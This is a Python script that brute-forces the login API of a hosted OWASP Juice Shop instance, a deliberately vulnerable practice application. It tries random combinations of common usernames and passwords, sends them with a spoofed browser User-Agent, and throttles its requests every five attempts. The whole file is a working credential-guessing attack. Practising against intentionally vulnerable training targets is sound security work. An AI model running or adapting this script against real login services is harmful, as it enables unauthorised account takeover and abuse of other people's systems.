import random
import requests
import time

url = "https://juice-shop.herokuapp.com/rest/user/login"

users = ["admin", "user", "test"]
passwords = ["admin", "password", "123456"]

def generate_login_attempts(users, passwords, attempts):
    login_attempts = []
    for _ in range(attempts):
        user = random.choice(users)
        password = random.choice(passwords)
        login_attempts.append((user, password))
    return login_attempts

def brute_force_user_login(user, password):
    data = {"email": user, "password": password}
    try:
        with requests.Session() as session:
            session.headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123"}
            response = session.post(url, json=data)

            if response.status_code == 200:
                print(f"Successful login with user: {user} and password: {password}")
                return True
            elif response.status_code == 401:
                print(f"Failed login attempt with user: {user} and password: {password}")
    except requests.exceptions.RequestException as e:
        print(f"Exception occurred: {e}")

    return False

successful_login = False
total_attempts = 0
max_attempts = 20  # Define the max attempts for brute-force
login_attempts = generate_login_attempts(users, passwords, max_attempts)

for user, password in login_attempts:
    total_attempts += 1
    successful_login = brute_force_user_login(user, password)

    if successful_login:
        break

    if total_attempts % 5 == 0:  # Add a condition to wait for a period
        time.sleep(1)  # Adding a delay for every 5 attempts

print("Brute force complete. Successful login: ", successful_login)
